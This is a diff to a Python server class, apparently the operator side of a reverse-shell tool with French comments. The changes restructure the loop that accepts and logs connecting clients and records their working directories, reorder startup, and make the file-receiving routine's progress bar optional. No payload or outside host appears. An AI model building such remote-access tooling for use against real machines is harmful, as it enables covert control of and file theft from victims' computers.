@@ -68,31 +68,31 @@ class Server:
             try:
                 client_socket, client_address = self.server_socket.accept()
             except OSError as e:
-                print(" ! Server socket fermer ! ".center())
+                print("\n ! Server socket fermer ! \n".center(80,"="))
                 break
-            else:
-                print(" \n\n ")
-                print(tabulate.tabulate(
-                                    [
-                                        [  
-                                            "Nouveau client connecté !", 
-                                            f" {client_address[0]}:{client_address[1]}", 
-                                            f"{datetime.now().time()}"
-                                        ]
-                                    ],
 
-                                    headers = [
-                                                "Notification", 
-                                                "Détails",
-                                                "Time"
+            print(" \n\n ")
+            print(tabulate.tabulate(
+                                [
+                                    [  
+                                        "Nouveau client connecté !", 
+                                        f" {client_address[0]}:{client_address[1]}", 
+                                        f"{datetime.now().time()}"
                                     ]
-                ))
-                # Reception du repertoire de travail du client 
-                cwd = client_socket.recv(BUFFER_SIZE).decode()
-                print("[+] Working directory en cours : ", cwd)
-                # Ajout du client au dictionnaire 
-                self.clients[client_address] = client_socket
-                self.clients_cwd[client_address] = cwd
+                                ], 
+
+                                headers = [
+                                            "Notification", 
+                                            "Détails",
+                                            "Time"
+                                ]
+            ))
+            # Reception du repertoire de travail du client 
+            cwd = client_socket.recv(BUFFER_SIZE).decode()
+            print("[+] Working directory en cours : ", cwd)
+            # Ajout du client au dictionnaire 
+            self.clients[client_address] = client_socket
+            self.clients_cwd[client_address] = cwd
 
     def accept_connections(self):
         # Accepter les nouveaux clients avec des threads separer (Multithreading)
@@ -164,8 +164,9 @@ class Server:
             Accepting client connections and starting the main interpreter
         """
         self.print_baniere()
-        self.start_interpreter()
         self.accept_connections()
+        self.start_interpreter()
+        
         
     
     def start_reverse_shell(self):
@@ -261,28 +262,28 @@ class Server:
         d'instance (Gain d'effoicacite et de peroformance du code )
     """
     @classmethod
-    def _receive_file(cls, s: socket.socket, buffer_size=4096):
+    def _receive_file(cls, s: socket.socket, buffer_size=4096,verbose=False):
+        # Reception des info du fichier a recevoir via le socket 
         received = s.recv(buffer_size).decode()
         filename, filesize = received.split(SEPARATOR)
-        # recupere juste le nom du fichier si le chemin est forunis 
+        # Effacer le chemin absolue et garder uniquement le filename 
         filename = os.path.basename(filename)
-        # Convertit en entier 
+        # Convertir la taille en entier 
         filesize = int(filesize)
-        # Commence la reception du fichier 
-        # Affiche la barre de progression ! Juste pour le kiff :) !!!!!!!!!!!!
-        progress = tqdm.tqdm(range(filesize), f" [info] : Reception >>[{filename}]<< ", unit="B", unit_scale=True, unit_divisor=1024)
- 
+        # Commencer la reception du fichier 
+        # et ecrire les data dans un fichiers ouvert en stream 
+        if verbose:
+            progress = tqdm.tqdm(range(filesize), f"Reception >>[{filename}]<< ", unit="B", unit_scale=True, unit_divisor=1024)
+        else:
+            progress = None
         with open(filename, "wb") as f:
             while True:
                 bytes_read = s.recv(buffer_size)
                 if not bytes_read:
-                    # Si aucune data a reçu ! La reception est terminer 
-                    break            
-                # Ecrire en binaire toutes les data recu 
+                    break
                 f.write(bytes_read)
-                # Mettre a jour la barre de progression 
-                progress.update(len(bytes_read))
-        # Une fois l'operation finis fermer le socket ! TOUJOURS FERMER LES SOCKETS OUVERTS !!!!!!!! TOUJOURS 
+                if verbose:
+                    progress.update(len(bytes_read))
         s.close()
 
     @classmethod
